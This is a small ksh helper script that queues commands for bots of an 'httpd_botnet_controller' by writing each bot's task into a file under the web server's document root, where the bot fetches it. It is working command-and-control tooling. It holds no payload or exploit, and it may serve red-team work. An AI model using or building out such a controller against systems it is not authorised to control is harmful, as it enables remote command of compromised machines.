#!/bin/ksh
#
# task_bot.sh
# Add a task for an httpd_botnet_controller bot
# By J. Stuart McMurray
# Created 20241027
# Last Modified 20241027

set -e

: ${CHECKIN_PATH:=httpd_botnet_controller}
: ${TASKING_DIR:=/var/www/htdocs/$CHECKIN_PATH}

# Bit of help.
if [[ -z "$1" ]] || [[ "-h" == "$1" ]]; then
        echo "Usage: $(basename $0) ID task|-" >&2
        exit 1;
fi

# Try to avoid clobbering existing tasking.
TF=$TASKING_DIR/$1
TFT=$TF.tmp
shift
if [[ -e "$TFT" ]]; then
        echo "Temporary file $TFT already exists, bailing" >&2
        exit 2
fi
if [[ -e "$TF" ]]; then
        echo "Temporarily renaming existing $TF as $TFT" >&2
        mv -i "$TF" "$TFT" >&2
fi

# Update tasking.
if [[ -n "$*" ]]; then # From argv.
        echo "$*" >> $TFT
else                   # From stdin.
        if [[ -t 0 ]]; then
                echo "WARNING: reading tasking from tty, EOF to end" >&2
        fi
        cat >> $TFT
fi

# Put the file back where it's grabbable.
mv "$TFT" "$TF" >&2
echo "Put tasking in $TF"
